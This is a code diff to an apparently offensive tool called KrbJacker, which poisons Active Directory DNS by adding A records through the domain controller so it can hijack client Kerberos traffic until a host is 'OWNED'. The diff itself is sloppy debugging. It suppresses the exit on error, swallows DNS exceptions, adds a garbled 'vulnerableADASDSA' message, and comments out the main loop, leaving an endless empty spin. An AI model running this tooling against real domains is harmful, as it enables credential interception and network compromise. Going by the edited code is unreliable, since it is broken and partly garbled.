@@ -45,7 +45,8 @@ class KrbJacker:
                 )
                 print("\tMaybe you mispelled something ?")
                 print("Bye.")
-                exit(1)
+                pass
+                #exit(1)
 
         # Get our own IP here
         try:
@@ -94,6 +95,7 @@ class KrbJacker:
 
     # Adds a single record A for this (name, ip)
     def add_dns_record(self, record_name, ip):
+        print("adding " + record_name)
         add = dns.update.Update(f"{self.domain}.")
         add.add(record_name, 300, "A", ip)
         response = dns.query.tcp(add, self.dc_ip, timeout=10)
@@ -135,7 +137,7 @@ class KrbJacker:
                 "side-effect inducing actions."
             )
             if is_poisonable:
-                print("\t", Fore.GREEN, Style.BRIGHT, "This domain IS vulnerable.")
+                print("\t", Fore.GREEN, Style.BRIGHT, "This domain IS vulnerableADASDSA.")
             else:
                 print(Fore.RED, Style.BRIGHT, "This domain IS NOT vulnerable")
             print(Style.RESET_ALL, Fore.RESET, end="")
@@ -201,20 +203,21 @@ class KrbJacker:
             self.poison_timer.start()
             self.is_poisoning_active = True
         while not self.owned:
-            print("--- --- Now waiting for clients --- ---")
+            pass
+            #print("--- --- Now waiting for clients --- ---")
             # Now we wait for interesting packes. Queue.get() is blocking.
             # Then we can extract the interesting packet from the Queue shared by all forwarders
             # The module variable contains the module object that sent the packet to the queue
-            client_ip, the_packet, the_module = interesting_packet_queue.get()
+            #client_ip, the_packet, the_module = interesting_packet_queue.get()
             # We then run the module who found the packet interesting
-            print(Fore.LIGHTYELLOW_EX, end="")
-            self.owned = the_module.run(self, client_ip, the_packet)
-            print(Fore.RESET, end="")
-            if not self.owned:
-                self.ignore_set.add(client_ip[0])
-                print(f"Added {client_ip[0]} to ignore set.")
-            else:
-                print(f"{Fore.GREEN} === OWNED ==={Fore.RESET}")
+           # print(Fore.LIGHTYELLOW_EX, end="")
+            #self.owned = the_module.run(self, client_ip, the_packet)
+            #print(Fore.RESET, end="")
+            #if not self.owned:
+            #    self.ignore_set.add(client_ip[0])
+            #    print(f"Added {client_ip[0]} to ignore set.")
+           # else:
+            #    print(f"{Fore.GREEN} === OWNED ==={Fore.RESET}")
         # Here the attack is finished and was successful, poisoning must be stopped
         if self.is_poisoning_active:
             self.unpoison()
@@ -239,8 +242,12 @@ class KrbJacker:
 
     def poison(self):
         # Check first if it is necessary to poison again
-        answers = self.get_dns_record(self.destination_name)
-        if len(answers) == 1 and answers[0] == self.my_ip:
+        answers = None
+        try:
+        	answers = self.get_dns_record(self.destination_name)
+        except Exception as e:
+                pass
+        if answers and len(answers) == 1 and answers[0] == self.my_ip:
             return
         else:
             # Then if necessary :
